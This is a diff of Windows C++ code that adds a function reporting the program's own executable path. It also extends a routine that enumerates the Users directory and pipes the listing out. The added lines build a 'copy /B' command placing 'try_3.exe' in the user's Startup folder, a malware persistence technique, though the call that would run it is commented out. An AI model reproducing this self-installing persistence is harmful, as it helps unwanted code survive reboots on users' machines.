@@ -126,6 +126,34 @@ std::string parser(const std::string res, std::vector<std::string> v) {
 }
 
 /*
+ *Finds the current path of the program
+ */
+int find_curr_dir() {
+	char Path[FILENAME_MAX];
+
+	//Will contain exe path
+	HMODULE hmodule = GetModuleHandle(NULL);
+	if (hmodule != NULL) {
+		//When passing NULL to GetModuleHandle, it returns handle of exe itself
+		GetModuleFileName(hmodule, (LPTSTR) Path, (sizeof(Path)));
+		std::string exePath = "";
+		///////////////////////////PARSE ARRAY///////////////////////
+		for (int i = 0; i < 260; i++) {
+			if (Path[i] != NULL) {
+				exePath += Path[i];
+			}
+		}
+		/////////////////////////////////////////////////////////////
+		std::cout << exePath << std::endl;
+	}
+	else {
+		std::cout << "Module handle is NULL" << std::endl;
+	}
+
+	return 0;
+}
+
+/*
  *This function prints the directories/files of the Users
  *directory and sends them to the char buffer via the pipe
  */
@@ -156,6 +184,13 @@ int startup_finder() {
 			folder.push_back(parts[i]);
 		}
 	}
+
+	//could use COPY windows command here
+	std::string start = "C:\\Users\\";
+	std::string end = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\try_3.exe";
+	find_curr_dir();
+	std::string startup_dir = "copy /B" + start + result + end;
+	//int i = system("dir");
 
 	return 0;
 }
